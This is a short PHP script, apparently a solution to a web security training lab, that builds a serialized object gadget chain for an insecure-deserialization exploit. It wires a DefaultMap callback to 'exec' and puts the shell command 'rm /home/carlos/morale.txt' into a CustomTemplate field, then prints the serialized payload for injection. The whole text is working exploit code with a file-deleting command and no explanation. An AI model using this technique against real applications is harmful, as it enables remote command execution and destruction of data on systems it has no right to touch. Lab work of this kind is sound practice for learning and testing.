<?php

class CustomTemplate {
    public $default_desc_type;
    public $desc;
}

class DefaultMap {
    public $callback;

    public function __construct($callback) {
        $this->callback = $callback;
    }
}

$defaultMapObject = new DefaultMap("exec");

$customTemplateObject = new CustomTemplate();

$customTemplateObject->default_desc_type = "rm /home/carlos/morale.txt";

$customTemplateObject->desc = $defaultMapObject;

$serializedObject = serialize($customTemplateObject);

echo $serializedObject;
